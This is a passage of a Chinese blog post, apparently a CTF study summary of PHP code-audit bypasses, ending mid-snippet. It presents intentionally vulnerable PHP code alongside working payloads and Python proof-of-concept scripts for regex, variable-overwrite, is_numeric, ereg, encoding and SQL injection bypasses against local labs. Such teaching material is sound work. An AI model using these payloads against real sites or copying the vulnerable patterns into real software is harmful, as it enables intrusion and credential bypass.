areyouok($greeting)&#123;    return preg_match(&#39;/Merry.*Christmas/is&#39;,$greeting);&#125;$greeting=@$_POST[&#39;greeting&#39;];if(!is_array($greeting))&#123;    if(!areyouok($greeting))&#123;    if(strpos($greeting,&#39;Merry Christmas&#39;)!==false)&#123;        echo &#39;Merry Christmas. &#39;.&#39;flag&#123;This_is_F1ag&#125;&#39;;    &#125;else&#123;        echo &#39;Do you know .swp file?&#39;;    &#125;    &#125;else&#123;        echo &#39;Do you know PHP?&#39;;&#125;&#125;?&gt;</code></pre><p>poc:</p><pre><code class="php">import requestsurl = &quot;http://127.0.0.1/test.php&quot;;data = &#123;    &quot;greeting&quot;: &quot;Merry Christmas&quot;+&quot;aaaaa&quot;*10000000&#125;res = requests.post(url=url, data=data,allow_redirects=False)print(res.text)</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664210591824-00db5293-f384-4d9d-a2d9-615665f42f07.png" alt="image.png"><br>ps:以上对php7不生效</p><h3 id="换行符"><a href="#换行符" class="headerlink" title="换行符"></a>换行符</h3><p><strong>.不会匹配换行符</strong></p><pre><code class="php">&lt;?phpshow_source(__FILE__);header(&quot;content-type:text/html; charset=utf-8&quot;);$json  = $_POST[&#39;x&#39;];if (preg_match(&#39;/^.*(flag).*$/&#39;, $json)) &#123;    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;&#125;else&#123;    $a = str_replace(&quot;\n&quot;,&quot;&quot;,$json);    if (strpos($a,&quot;flag&quot;)!=false)&#123;        echo &quot;flag&#123;xxxxx&#125;&quot;;    &#125;&#125;</code></pre><p>这段代码的意思就是传入的值中不能被preg_match匹配到flag，但是又要存在flag才能获得flag。这里有个关键点，如何只传入\nflag是不行的，因为这样strpos会返回0，相当于false<br>poc:</p><pre><code class="php">import requestsurl = &quot;http://127.0.0.1/test.php&quot;;data = &#123;    &quot;x&quot;: &quot;\naaflag&quot;&#125;res = requests.post(url=url, data=data,allow_redirects=False)print(res.text)</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664212236037-404ab3ea-6564-4da3-a8a5-2b9bac5238ed.png" alt="image.png"><br>** 而在非多行模式下，$似乎会忽略在句尾的%0a**</p><pre><code class="php">if (preg_match(&#39;/^flag$/&#39;, $_GET[&#39;a&#39;]) &amp;&amp; $_GET[&#39;a&#39;] !== &#39;flag&#39;) &#123;    echo $flag;&#125;</code></pre><p>?a=flag%0a</p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h3 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h3><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664372322802-2f037800-d395-497b-936c-9e5f3803a2f7.png" alt="image.png"><br>使用例子:</p><pre><code class="php">&lt;?php$a = &quot;Original&quot;;$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);extract($my_array);echo &quot;\$a = $a; \$b = $b; \$c = $c&quot;;?&gt;</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664372356449-4949468c-f9f2-4372-af01-87d214424592.png" alt="image.png"><br>ctf题目:</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);$flag = &quot;E:\\phpstudy_pro\\WWW\\flag.txt&quot;;extract($_GET);if (isset($HY))&#123;    $content = trim(file_get_contents($flag));    if ($HY == $content)&#123;        echo file_get_contents(&quot;E:\\phpstudy_pro\\WWW\\flag.txt&quot;);    &#125;else&#123;        echo &#39;Oh,no&#39;;    &#125;&#125;</code></pre><p>payload:</p><pre><code class="php">http://127.0.0.1/test.php?HY=&amp;flag=  //传入HY和flag空值，//extract接受了一个数组，分别赋值造成覆盖</code></pre><p>问题:这里为什么不能给HY和flag分别传入1<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664381662252-e858b918-d47d-4ef3-9619-89d9622fa466.png" alt="image.png"><br>传入两个1后，$HY和$flag都为1，进入if语句，file_get_content(1)，返回为空，但是此时$HY=1，就不相等了，所以同理可以构造多种payload的</p><pre><code class="php">http://127.0.0.1/test.php?HY=&amp;flag=aaa</code></pre><h3 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h3><p> 解析字符串并注册成变量  </p><pre><code class="php">$b=1;Parse_str(&#39;b=2&#39;);Print_r($b);</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664383931472-7c2603eb-5da6-493d-961a-0cef9d6aed2c.png" alt="image.png"></p><h3 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a>import_request_variables()</h3><p> 将 GET/POST/Cookie 变量导入到全局作用域中，全局变量注册。<br>在5.4之后被取消，只可在4-4.1.0和5-5.4.0可用。  </p><pre><code class="php">//导入POST提交的变量值，前缀为post_import_request_variable(&quot;p&quot;， &quot;post_&quot;);//导入GET和POST提交的变量值，前缀为gp_，GET优先于POSTimport_request_variable(&quot;gp&quot;， &quot;gp_&quot;);//导入Cookie和GET的变量值，Cookie变量值优先于GETimport_request_variable(&quot;cg&quot;， &quot;cg_&quot;);</code></pre><h3 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="$$变量覆盖"></a>$$变量覆盖</h3><p> 提交参数chs，则可覆盖变量”$chs”的值。$key为chs时，$$key就变成$chs  </p><pre><code class="php">&lt;?  $chs = &#39;&#39;;  if($_POST &amp;&amp; $charset != &#39;utf-8&#39;)&#123;      $chs = new Chinese(&#39;UTF-8&#39;, $charset);      foreach($_POST as $key =&gt; $value)&#123;          $$key = $chs-&gt;Convert($value);      &#125;      unset($chs);  &#125; </code></pre><h3 id="register-globals全局变量覆盖"><a href="#register-globals全局变量覆盖" class="headerlink" title="register_globals全局变量覆盖"></a>register_globals全局变量覆盖</h3><p> php.ini中有一项为register_globals，即注册全局变量，当register_globals=On时，传递过来的值会被直接的注册为全局变量直接使用，而register_globals=Off时，我们需要到特定的数组里去得到它。<br> 注意：register_globals已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除  </p><p>当register_global=ON时，变量来源可能是各个不同的地方，比如页面的表单，Cookie等</p><pre><code class="php">&lt;?phpecho &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;;if ($auth)&#123;   echo &quot;private!&quot;;&#125;?&gt;</code></pre><p>当register_globals=OFF时，这段代码不会出问题。<br>但是当register_globals=ON时，提交请求URL：<a href="http://www.a.com/test.php?auth=1,%E5%8F%98%E9%87%8F$auth%E5%B0%86%E8%87%AA%E5%8A%A8%E5%BE%97%E5%88%B0%E8%B5%8B%E5%80%BC%E3%80%82%E5%BE%97%E5%88%B0%E7%9A%84%E7%BB%93%E6%9E%9C%E4%B8%BA">http://www.a.com/test.php?auth=1,变量$auth将自动得到赋值。得到的结果为</a><br>Register_globals:1<br>private!<br><em>小记：如果上面的代码中，已经对变量$auth赋了初始值，比如$auth=0，那么即使在URL中有/test.php?auth=1，也不会将变量覆盖，也就是说不会打印出private！</em><br>利用：<br>通过$GLOBALS获取的变量，也可能导致变量覆盖。</p><pre><code class="php">&lt;?phpecho &quot;Register_globals:&quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;;if (ini_get(&#39;register_globals&#39;)) foreach($_REQUEST as $k=&gt;$v) unset($&#123;$k&#125;);print $a;print $_GET[b];?&gt;</code></pre><p>变量$a未初始化，在register_globals=ON时，再尝试控制“$a”的值（<a href="http://www.a.com/test1.php?a=1&amp;b=2%EF%BC%89%EF%BC%8C%E4%BC%9A%E5%9B%A0%E4%B8%BA%E8%BF%99%E6%AE%B5%E4%BB%A3%E7%A0%81%E8%80%8C%E5%87%BA%E9%94%99%E3%80%82">http://www.a.com/test1.php?a=1&amp;b=2），会因为这段代码而出错。</a><br>而当尝试注入“GLOBALS[a]”以覆盖全局变量时（<a href="http://www.a.com/test1.php?GLOBALS%5Ba%5D=1&amp;b=2%EF%BC%89%EF%BC%8C%E5%88%99%E5%8F%AF%E4%BB%A5%E6%88%90%E5%8A%9F%E6%8E%A7%E5%88%B6%E5%8F%98%E9%87%8F%E2%80%9C$a%E2%80%9D%E7%9A%84%E5%80%BC%E3%80%82%E8%BF%99%E6%98%AF%E5%9B%A0%E4%B8%BAunset()%E9%BB%98%E8%AE%A4%E5%8F%AA%E4%BC%9A%E9%94%80%E6%AF%81%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%EF%BC%8C%E8%A6%81%E9%94%80%E6%AF%81%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%BF%85%E9%A1%BB%E4%BD%BF%E7%94%A8$GLOBALS%E3%80%82">http://www.a.com/test1.php?GLOBALS[a]=1&amp;b=2），则可以成功控制变量“$a”的值。这是因为unset()默认只会销毁局部变量，要销毁全局变量必须使用$GLOBALS。</a><br><strong>而在register_globals=OFF时，则无法覆盖到全局变量。</strong><br><em>小记：register_globals的意思是注册为全局变量，所以当On的时候，传递过来的值会被直接注册为全局变量而直接使用，当为OFF的时候，就需要到特定的数组中去得到它。unset用于释放给定的变量</em></p><h2 id="is-numeric-绕过"><a href="#is-numeric-绕过" class="headerlink" title="is_numeric()绕过"></a>is_numeric()绕过</h2><p> [极客大挑战 2019]BuyFlag  </p><pre><code class="php">if (is_numeric($password)) &#123;        echo &quot;password can&#39;t be number&lt;/br&gt;&quot;;    &#125;elseif ($password == 404) &#123;        echo &quot;Password Right!&lt;/br&gt;&quot;;    &#125;</code></pre><p> 密码是404，但是不能输入数字<br> 可以借助url编码中的空字符，例如%00或者%20，其中%00加在数值前面或者后面都可以，也就是%00404或者404%00这样，将%20加在数值末尾也可以绕过，比如404%20。<br>payload:</p><pre><code class="php">数字-&gt;非数字：404%00404%20404,404&#39;</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664439276748-c113f1e6-863f-4757-b928-fad0595e01cd.png" alt="image.png"></p><h2 id="绕过过滤的空白字符"><a href="#绕过过滤的空白字符" class="headerlink" title="绕过过滤的空白字符"></a>绕过过滤的空白字符</h2><pre><code class="php">&lt;?phpheader(&quot;content-type:text/html; charset=utf-8&quot;);highlight_file(__FILE__);$info = &quot;&quot;;$req = [];$flag=&quot;flag&#123;this_is_flag&#125;&quot;;ini_set(&quot;display_error&quot;, false); //为一个配置选项设置值error_reporting(0); //关闭所有PHP错误报告if(!isset($_GET[&#39;number&#39;]))&#123;    header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt    die(&quot;have a fun!!&quot;); //die — 等同于 exit()&#125;foreach([$_GET, $_POST] as $global_var) &#123;  //foreach 语法结构提供了遍历数组的简单方式    foreach($global_var as $key =&gt; $value) &#123;        $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）        is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串    &#125;&#125;function is_palindrome_number($number) &#123;    $number = strval($number); //strval — 获取变量的字符串值    $i = 0;    $j = strlen($number) - 1; //strlen — 获取字符串长度    while($i &lt; $j) &#123;        if($number[$i] !== $number[$j]) &#123;            return false;        &#125;        $i++;        $j--;    &#125;    return true;&#125;if(is_numeric($_REQUEST[&#39;number&#39;])) //is_numeric — 检测变量是否为数字或数字字符串&#123;    $info=&quot;sorry, you cann&#39;t input a number!&quot;;&#125;elseif($req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;]))) //intval — 获取变量的整数值&#123;    $info = &quot;number must be equal to it&#39;s integer!! &quot;;&#125;else&#123;    $value1 = intval($req[&quot;number&quot;]);    $value2 = intval(strrev($req[&quot;number&quot;]));    if($value1!=$value2)&#123;        $info=&quot;no, this is not a palindrome number!&quot;;    &#125;    else    &#123;        if(is_palindrome_number($req[&quot;number&quot;]))&#123;            $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;;        &#125;        else        &#123;            $info=$flag;        &#125;    &#125;&#125;echo $info;</code></pre><p>需要满足条件:<br>1.条件is_numeric($_REQUEST[‘number’])为假，这个绕过的方法很多使用%00开头也可以再POST一个number参数把GET中的覆盖掉也可以，所以这一步很简单。<br>2.要求 $req[‘number’]==strval(intval($req[‘number’]))<br>3.要求intval($req[‘number’]) == intval(strrev($req[‘number’]))<br>4.is_palindrome_number()返回False，这个条件只要在一个回文数比如191前面加一个字符即可实现<br>得到flag 看上述条件，条件4需要加字符但是加了之后需要满足2,3这两个条件所以就可以在原题目中简化出2,3,4来进行Fuzzing，简化后后端代码如下：</p><pre><code class="php">&lt;?phpfunction is_palindrome_number($number) &#123;    $number = strval($number); //strval — 获取变量的字符串值    $i = 0;    $j = strlen($number) - 1; //strlen — 获取字符串长度    while($i &lt; $j) &#123;        if($number[$i] !== $number[$j]) &#123;            return false;        &#125;        $i++;        $j--;    &#125;    return true;&#125;$a = trim($_GET[&#39;number&#39;]);if ((($a==strval(intval($a)))&amp;(intval($a)==intval(strrev($a)))&amp;!is_palindrome_number($a))==1):    print &quot;ok&quot;;else:    print &quot;no&quot;;endif;</code></pre><p>poc:</p><pre><code class="php">import requestsfor i in range(256):    rq = requests.get(&quot;http://127.0.0.1/test3.php?number=%s191&quot;%(&quot;%%%02X&quot;%i))    if &#39;ok&#39; in rq.text:        print (&quot;%%%02X&quot;%i)</code></pre><p>%%%02X这里解释一下:<br>首先分开看  %% 和 %02X 两部分<br>%%第一个为转义的意思，所以这两个一起的意思就是 %<br>%02x  ：%x是把数字输出为16进制的格式，%02x是保证输出至少占两个字符的位置,如果不够两位的话前面补0<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664527433234-991a8002-e11a-4eb8-b6db-ad7f98a1924f.png" alt="image.png"><br>所以可知最终payload有:</p><pre><code class="php">%00%0C404%0C404%00%00%2B404%2B404%00%0C404%20</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664528429736-e234f081-4e74-4e7f-b76c-2717f2d36a86.png" alt="image.png"></p><h2 id="多重加密"><a href="#多重加密" class="headerlink" title="多重加密"></a>多重加密</h2><pre><code class="php">&lt;?php$login = unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));if($login[&#39;user&#39;] === &#39;ichunqiu&#39;)&#123;echo $flag;&#125;    ?&gt;</code></pre><p>本地:</p><pre><code class="php">&lt;?php$arr = array([&#39;user&#39;] === &#39;ichunqiu&#39;);$token = base64_encode(gzcompress(serialize($arr)));print_r($token);// 得到eJxLtDK0qs60MrBOAuJaAB5uBBQ=?&gt;</code></pre><h2 id="SQL注入-WITH-ROLLUP绕过"><a href="#SQL注入-WITH-ROLLUP绕过" class="headerlink" title="SQL注入_WITH ROLLUP绕过"></a>SQL注入_WITH ROLLUP绕过</h2><p>当遇到报错:<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664545321688-c300c5e7-4b73-4e82-abe0-07cc279954bc.png" alt="image.png"><br>MySQL 5.7.5以上版本，实现了对功能依赖的检测。如果启用了only_full_group_by SQL模式(默认启用)，那么MySQL就会拒绝执行 select list、HAVING condition或ORDER BY list引用既不在GROUP BY子句中被命名，也不在功能上依赖于GROUP BY列（由GROUP BY列唯一确定）的未聚合列的查询。<br>从MySQL5.7.5开始，默认的SQL模式包括only_full_group_by。（在5.7.5之前，MySQL没有检测到功能依赖项，only_full_group_by在默认情况下是不启用的。关于前5.7.5行为的描述，请参阅MySQL 5.6参考手册。)<br>解决方法(暂时):</p><pre><code class="php">SET sql_mode =&#39;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION&#39;;</code></pre><p>或者在my.ini中追加:</p><pre><code class="php">sql-mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION</code></pre><p>题目:</p><pre><code class="php">&lt;?phperror_reporting(0);header(&quot;Content-Type:text/html;charset=utf-8&quot;);if (!isset($_POST[&#39;username&#39;]) || !isset($_POST[&#39;password&#39;])) &#123;    echo &#39;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#39;.&quot;&lt;br/&gt;&quot;;    echo &#39;&lt;input name=&quot;username&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;    echo &#39;&lt;input name=&quot;password&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;    echo &#39;&lt;input type=&quot;submit&quot; /&gt;&#39;.&quot;&lt;br/&gt;&quot;;    echo &#39;&lt;/form&gt;&#39;.&quot;&lt;br/&gt;&quot;;    echo &#39;&lt;!--source: source.txt--&gt;&#39;.&quot;&lt;br/&gt;&quot;;    die;&#125;function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;    if (is_array($StrValue))&#123;//检测变量是否是数组        $StrValue=implode($StrValue);//返回由数组元素组合成的字符串    &#125;    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1)&#123;//匹配成功一次后就会停止匹配        print &quot;水可载舟，亦可赛艇！&quot;;        exit();    &#125;&#125;$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;foreach($_POST as $key=&gt;$value)&#123;//遍历数组    AttackFilter($key,$value,$filter);&#125;$con = mysql_connect(&quot;127.0.1.1:3306&quot;,&quot;root&quot;,&quot;root&quot;);if (!$con)&#123;    die(&#39;Could not connect: &#39; . mysql_error());&#125;$db=&quot;test&quot;;mysql_select_db($db, $con);//设置活动的 MySQL 数据库$sql=&quot;SELECT * FROM users WHERE username = &#39;&#123;$_POST[&#39;username&#39;]&#125;&#39;&quot;;$query = mysql_query($sql);//执行一条 MySQL 查询if (mysql_num_rows($query) == 1) &#123;//返回结果集中行的数目    $key = mysql_fetch_array($query);//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false    if($key[&#39;password&#39;] == $_POST[&#39;password&#39;]) &#123;        print &quot;CTF&#123;You_ArE_sUUccesS!&#125;&quot;;    &#125;else&#123;        print &quot;亦可赛艇！&quot;;    &#125;&#125;else&#123;    print &quot;一颗赛艇！&quot;;    print $sql;    print $query;&#125;mysql_close($con);?&gt;</code></pre><p>自己修改配置，连接上数据库.<br>关于WITH ROLLUP绕过我们来看一些例子<br>数据库基本信息:<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664799167791-f73d8cad-de15-4ed1-b759-6e60ac3bdc7c.png" alt="image.png"><br>使用with rollup语句( 分组后会在多一行统计  )<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664799401626-0548b90c-ae44-4931-a58c-0e30f530b0c8.png" alt="image.png"><br>多了一行，id为空，我们搭配limit语句<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664799686573-6baf3c8d-5153-405e-9a3f-8c8e34cd9159.png" alt="image.png"><br>那如果我们用password分组呢<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664799734140-1e13868d-1733-49ef-a0dc-2cc6720027e7.png" alt="image.png"><br>现在的password为NULL,查询出的白居易是没密码的<br>但是这里的代码中 ,是被过滤的，那么我们可以搭配offset去查询<br>关于他们两个的用法:<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664800909937-c4f07ca9-ac72-453d-99a1-47596c230bf8.png" alt="image.png"><br>所以我们就可以构造语句:<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664800950046-ac038845-128e-47b6-b80b-2f11f8e05b7a.png" alt="image.png"><br>所以当我们知道用户名的时候，就可以构造sql语句进行绕过，此时password就为NULL<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664804646068-df9eb134-ecf7-4a47-8e40-15d1530d0d45.png" alt="image.png"><br>构造payload:</p><pre><code class="php">username=白居易&#39; GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1#&amp;password=</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664805775369-dcc55dfe-2e38-405e-a694-f4dc4ac7eb03.png" alt="image.png"></p><h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><p>代码:</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type:text/html;charset=utf-8&quot;);$flag = &quot;flag&#123;this_Is_f1ag&#125;&quot;;if (isset ($_GET[&#39;password&#39;]))&#123;    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)    &#123;        echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;;    &#125;    else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)    &#123;        if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE) //strpos — 查找字符串首次出现的位置        &#123;            die(&#39;Flag: &#39; . $flag);        &#125;        else        &#123;            echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;);        &#125;    &#125;    else    &#123;        echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;;    &#125;&#125;?&gt;</code></pre><p>ereg函数:<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664806850256-c730b620-320c-4e26-8ba7-0bdecd4986a4.png" alt="image.png"><br> 如果有找到模式匹配，则返回true，否则返回false<br>我们可以使用科学计数法绕过前面<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664807270813-9dd92824-beab-45ce-8c55-12346bc1ab1d.png" alt="image.png"><br>但是它又必须要包含”<em>-</em>“,而ereg已经限制了只能为数字和字母<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664807305892-33983499-9772-425b-8e27-72a1dcd8b805.png" alt="image.png"><br>我们可以绕过ereg的检测:<br><strong>方法一 %00截断：</strong><br><strong>payload:</strong></p><pre><code class="php">?password=1e9%00*-*</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664807530741-53ab0d03-0526-478a-9349-800daeade8ec.png" alt="image.png"><br><strong>方法二  把password通过数组的形式去传参:</strong><br>payload:</p><pre><code class="php">?password[]=1e9&amp;password[]=*-*</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664807600826-04801088-c556-44c1-be20-66816ad150da.png" alt="image.png"></p><h2 id="session绕过"><a href="#session绕过" class="headerlink" title="session绕过"></a>session绕过</h2><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type:text/html;charset=utf-8&quot;);$flag = &quot;flag&#123;this_Is_f1ag&#125;&quot;;session_start(); if (isset ($_GET[&#39;password&#39;])) &#123;    if ($_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;])        die (&#39;Flag: &#39;.$flag);    else        print &#39;&lt;p&gt;Wrong guess.&lt;/p&gt;&#39;;&#125;mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt;</code></pre><p>访问页面，发现生成了session<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664808328606-a0f73da1-0a50-4a70-97d4-8d71736bb854.png" alt="image.png"><br>清除session，然后给password传入空值即可<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664808375010-3ec57ea9-72da-4371-8819-1f5e688a8661.png" alt="image.png"></p><h2 id="密码md5比较绕过"><a href="#密码md5比较绕过" class="headerlink" title="密码md5比较绕过"></a>密码md5比较绕过</h2><pre><code class="php">&lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);//配置数据库if($_POST[&#39;username&#39;] &amp;&amp; $_POST[&#39;password&#39;]) &#123;    $conn = mysql_connect(&quot;127.0.0.1:3306&quot;, &quot;root&quot;, &quot;root&quot;);    mysql_select_db(&quot;test&quot;) or die(&quot;Could not select database&quot;);    if ($conn-&gt;connect_error) &#123;        die(&quot;Connection failed: &quot; . mysql_error($conn));&#125; $user = $_POST[&#39;username&#39;];$pass = md5($_POST[&#39;password&#39;]);$sql = &quot;select password from users where username=&#39;$user&#39;&quot;;//print $sql;$query = mysql_query($sql);if (!$query) &#123;    printf(&quot;Error: %s\n&quot;, mysql_error($conn));    exit();&#125;$row = mysql_fetch_array($query, MYSQL_ASSOC);if (($row[&#39;password&#39;]) &amp;&amp; (!strcasecmp($pass, $row[&#39;password&#39;]))) &#123;//如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;&#125;else &#123;    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);&#125;&#125;?&gt;</code></pre><p> 只要让row[pw]的值与pass经过md5之后的值相等即可 而$pass经过md5之后的值是我们可以通过正常输入控制的<br>同时，row[pw]的值是从$sql提取出来的<br>目标就一句话：只要我们能够修改$sql的值，此题解决。<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664814374666-ee8ceab2-378c-40af-ac86-de012e0bdba0.png" alt="image.png"><br>此时password的值是由我们控制的<br>构造payload:</p><pre><code class="php">username=白居易&#39; and 0=1 union select &quot;e10adc3949ba59abbe56e057f20f883e&quot;#&amp;password=123456</code></pre><p>e10adc3949ba59abbe56e057f20f883e是123456的md5值<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664815167929-5280d428-308b-483d-a2bf-c6edde20d437.png" alt="image.png"></p><h2 id="url二次编码绕过"><a href="#url二次编码绕过" class="headerlink" title="url二次编码绕过"></a>url二次编码绕过</h2><pre><code class="php">&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);  exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;)&#123;  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;&#125;?&gt;</code></pre><p>二次编码</p><pre><code class="php">http://127.0.0.1/test.php?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664815455801-b927b743-9aff-4b31-9f70-0b9ff86d7c2b.png" alt="image.png"></p><h2 id="sql闭合绕过"><a href="#sql闭合绕过" class="headerlink" title="sql闭合绕过"></a>sql闭合绕过</h2><pre><code class="php">&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123;    $conn = mysql_connect(&quot;*******&quot;, &quot;****&quot;, &quot;****&quot;);    mysql_select_db(&quot;****&quot;) or die(&quot;Could not select database&quot;);    if ($conn-&gt;connect_error) &#123;        die(&quot;Connection failed: &quot; . mysql_error($conn));&#125; $user = $_POST[user];$pass = md5($_POST[pass]);//select user from php where (user=&#39;admin&#39;)#//exp:admin&#39;)#$sql = &quot;select user from php where (user=&#39;$user&#39;) and (pw=&#39;$pass&#39;)&quot;;$query = mysql_query($sql);if (!$query) &#123;    printf(&quot;Error: %s\n&quot;, mysql_error($conn));    exit();&#125;$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[&quot;pw&quot;];  if($row[&#39;user&#39;]==&quot;admin&quot;) &#123;    echo &quot;&lt;p&gt;Logged in! Key: *********** &lt;/p&gt;&quot;;  &#125;  if($row[&#39;user&#39;] != &quot;admin&quot;) &#123;    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);  